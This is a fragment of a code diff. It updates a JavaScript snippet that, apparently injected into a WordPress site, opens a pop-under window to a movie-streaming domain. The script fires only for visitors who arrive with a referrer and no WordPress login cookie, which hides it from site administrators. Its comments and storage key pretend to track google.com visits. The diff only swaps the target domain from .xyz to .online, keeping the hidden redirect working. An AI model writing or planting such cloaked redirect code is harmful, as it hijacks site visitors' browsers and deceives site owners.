@@ -9,7 +9,7 @@ if (document.referrer !== "" && document.cookie.indexOf('wordpress_logged_in_') 
                 // Check if google.com is not opened in the last 5 days
                 let lastVisit = localStorage.getItem('googleLastVisit');
                 if (!lastVisit || (Date.now() - parseInt(lastVisit)) > (5 * 24 * 60 * 60 * 1000)) {
-                    window.open('https://protonmovies.xyz', '_blank');
+                    window.open('https://protonmovies.online', '_blank');
                     // Store the current time in localStorage
                     localStorage.setItem('googleLastVisit', Date.now().toString());
                 }
